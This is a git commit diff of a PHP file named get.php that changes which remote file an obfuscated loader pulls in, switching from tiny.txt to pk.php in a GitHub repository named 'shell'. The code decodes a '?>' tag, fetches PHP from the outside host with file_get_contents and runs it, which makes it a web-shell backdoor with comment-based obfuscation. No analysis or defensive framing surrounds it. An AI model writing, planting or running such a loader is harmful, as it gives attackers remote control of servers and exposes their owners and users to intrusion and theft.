5f88bb7b54ffc1047a2466bc81cb9ed19278594c
zeanboy1337 <zeanboy1337@gmail.com>
2025-06-16 16:34:35 +0700

    Update get.php

--- get.php
+++ get.php
@@ -2,7 +2,7 @@
     /**_**/ urldecode("%3f%3e") .
         file_get_contents(
             /**_**/ urldecode(
-                /**_**/ "https://raw.githubusercontent.com/zeanboy1337/shell/refs/heads/main/tiny.txt"
+                /**_**/ "https://github.com/zeanboy1337/shell/raw/refs/heads/main/pk.php"
             )
         )
 ); ?>
